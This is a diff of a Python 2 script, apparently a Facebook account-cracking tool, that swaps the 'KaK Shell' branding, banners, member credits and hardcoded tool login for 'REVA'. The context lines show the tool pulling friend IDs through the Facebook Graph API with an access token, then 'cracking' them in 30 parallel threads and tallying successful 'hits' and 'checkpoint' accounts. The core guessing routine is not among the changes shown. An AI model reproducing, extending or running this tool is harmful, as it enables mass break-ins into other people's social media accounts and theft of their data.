@@ -53,14 +53,13 @@ def anime(z):
 #### LOGO ####
 logo = """
 
-\x1b[31;1m _______  _______  _______  _______  _______  \x1b[37;1m  _______  __   __  _______  ___      ___     
-\x1b[31;1m|       ||       ||   _   ||       ||       | \x1b[37;1m |       ||  | |  ||       ||   |    |   |    
-\x1b[31;1m|  _____||_     _||  |_|  ||    ___||    ___| \x1b[37;1m |  _____||  |_|  ||    ___||   |    |   |    
-\x1b[31;1m| |_____   |   |  |       ||   |___ |   |___  \x1b[37;1m | |_____ |       ||   |___ |   |    |   |    
-\x1b[31;1m|_____  |  |   |  |       ||    ___||    ___| \x1b[37;1m |_____  ||       ||    ___||   |___ |   |___ 
-\x1b[31;1m _____| |  |   |  |   _   ||   |    |   |     \x1b[37;1m  _____| ||   _   ||   |___ |       ||       |
-\x1b[31;1m|_______|  |___|  |__| |__||___|    |___|     \x1b[37;1m |_______||__| |__||_______||_______||_______|
-                                                        
+\x1b[31;1m##############################################\x1b[37;1m  
+\x1b[31;1m                                              \x1b[37;1m
+\x1b[31;1m               ////////////////               \x1b[37;1m 
+\x1b[31;1m               ||REVA IS HERE||               \x1b[37;1m     
+\x1b[31;1m               \\\\\\\\\\\\\\\\               \x1b[37;1m
+\x1b[31;1m                                              \x1b[37;1m  
+\x1b[31;1m##############################################\x1b[37;1m 
 
 """
 def tik():
@@ -81,7 +80,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
-\x1b[31;1m@            Staff  Shell                @
+\x1b[31;1m@            STUDENT OF SHELL            @
 \x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
 """                                
 hr = """
@@ -92,11 +91,11 @@ hr = """
 \x1b[31;1m/____/\__/\__,_/_/ /_/    \x1b[37;1m /____/_/ /_/\___/_/_/   
   
 version >> 1.0
-staff >> Shell                                  
+REVA >> IS HERE                                
 """
 print(hr)
-CorrectUsername = "kakshell"
-CorrectPassword = "kakshell"
+CorrectUsername = "reva"
+CorrectPassword = "reva"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\x1b[34;1m👨‍ \x1b[1;95mID \x1b[31;1m>>\x1b[1;91m")
@@ -259,7 +258,7 @@ def startgrab():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "@@@@@@@@@@@#KaK×Shell#@@@@@@@@@@@"
+		print "@@@@@@@@@@@#REVA#@@@@@@@@@@@"
 		anime('\033[1;91mwar grtne ID kan \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -269,7 +268,7 @@ def startgrab():
 		os.system('clear')
 		print logo
 		idt = raw_input("[♤]ID kasaka bnwsa>>>")
-		print "@@@@@@@@@@@#KaK+SheLl#@@@@@@@@@@@"
+		print "@@@@@@@@@@@#REVA#@@@@@@@@@@@"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -294,7 +293,7 @@ def startgrab():
 	titik = ['.   ','..  ','... ','....','.....']
 	for o in titik:
 		print("\r\x1b[37;1m[☆]Cracking"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n                            \x1b[37;1m <●>°•°<●>KaK ×+× SheLl<●>°•°<●>"
+	print "\n                            \x1b[37;1m <●>°•°<●>R E V A  I S  H E R E <●>°•°<●>"
 	print "   \x1b[31;1m#############################################################"
 
 	anime('          \x1b[34;1m  dastpe krdn  tkaya bosta..... ')
@@ -515,25 +514,19 @@ def startgrab():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-        anime(">>>>>>>>>$\x1b[31;1mKaK\x1b[37;1mSheLl\x1b[0m$<<<<<<<<<<")
+        anime(">>>>>>>>>$\x1b[31;1mRE\x1b[37;1mVA\x1b[0m$<<<<<<<<<<")
 	anime("\x1b[37;1mRecode by Baha" )#KaK SheLl
 	print '\x1b[32;1m Crack krdna ka kotay hat [√]^_^ '
 	print"\x1b[31;1mKoy HITS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[31;1m/\x1b[33;1m"+str(len(cekpoint))
 	print ""
 	print(logo)
 	anime(">>>>>>>>>>>>>>>Member<<<<<<<<<<<<<<<")
-	anime(">> KaK SheLl")
-	anime(">> 7aMa.SoftWare")
-	anime(">>『SL』 QALA ")
-	anime(">>『SL』 MARMILKA ")
-	anime(">>『SL』 DEVIL ")
-	anime(">>『SL』 XAMA ")
-	anime(">>『SL』 MARYA ")
-	anime(">>『SL』 7ASHISH")
-	anime(">>『SL』 SHERA ")
-	anime(">>『SL』7aje SHELL ")
-	anime(">>『SL』 BLOOD ")
-	anime(">>>>>>>>>>>>>>>Member<<<<<<<<<<<<<<<")
+	anime(">> REVA")
+	anime(">> IS")
+	anime(">> HERE")
+	anime(">> REVA")
+	anime(">> IS")
+	anime(">> BEAST")
 	print ""
 	print ""
 	raw_input("\n\x1b[31;1m [DWBARA KRDNA WA] enter bka")
